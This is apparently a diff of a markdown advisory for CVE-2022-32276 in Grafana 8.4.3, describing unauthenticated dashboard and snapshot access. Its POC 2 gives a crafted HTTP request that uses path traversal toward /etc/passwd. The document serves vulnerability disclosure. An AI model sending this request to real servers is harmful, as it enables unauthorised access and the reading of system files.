@@ -3,7 +3,7 @@ grafana 8.4.3 (b7d2911ca)
 
 # First point - CVE-2022-32276
 
-##Unauthenticated and authenticated users can send a false request for snapshot query using random key parameters, having access to the system dashboard area by going through the login page.
+## Unauthenticated and authenticated users can send a false request for snapshot query using random key parameters, having access to the system dashboard area by going through the login page.
 •	Rated version: 8.4.3 (b7d2911ca)
 •	
 Access the system the user is directed to the system home page, as image 1
@@ -35,7 +35,7 @@ Image 4: Unauthenticated access to the filter menu
 ##
 •	Rated version: 8.4.3 (b7d2911ca)
 •	Injection of parameters in http request.
-It has been verified that by injecting the following request into the login form the system returns internal page.
+## It has been verified that by injecting the following request into the login form the system returns internal page.
 
 ![image](https://user-images.githubusercontent.com/28454566/171640044-cf2029dc-8598-44f9-87ed-c6c09a152212.png)
 
@@ -64,8 +64,11 @@ Image 7: Request changed before submission to server
 Image 8: Data returned from the tampered request
 
 
+
 ### POC 2
 Send the request to the Burpsuite Repeater  function and change the request header to:
+
+```
 GET /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1 HTTP/1.1
 Host: <grafana_host>:3000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
@@ -76,6 +79,8 @@ Connection: close-up
 Upgrade-Insecure-Requests: 1
 Pragma: no-cache
 Cache-Control: no-cache
+```
+
 
 
 ![image](https://user-images.githubusercontent.com/28454566/171640452-7d292f9f-c35e-4067-b199-2ae9dea9ecbd.png)
@@ -90,7 +95,13 @@ Image 10: Unauthenticated access
 
 
 
-
-
+## References:
+<li>https://cwe.mitre.org/data/definitions/1345.html</li>
+<li>https://cwe.mitre.org/data/definitions/284.html</li>
+<li>https://cwe.mitre.org/data/definitions/552.html</li>
+<li>https://cwe.mitre.org/data/definitions/548.html</li>
+<li>https://cwe.mitre.org/data/definitions/706.html</li>
+<li>https://owasp.org/www-pdf-archive/OWASP_SCP_v1.3_pt-BR.pdf</li>
+</ol>
 
 
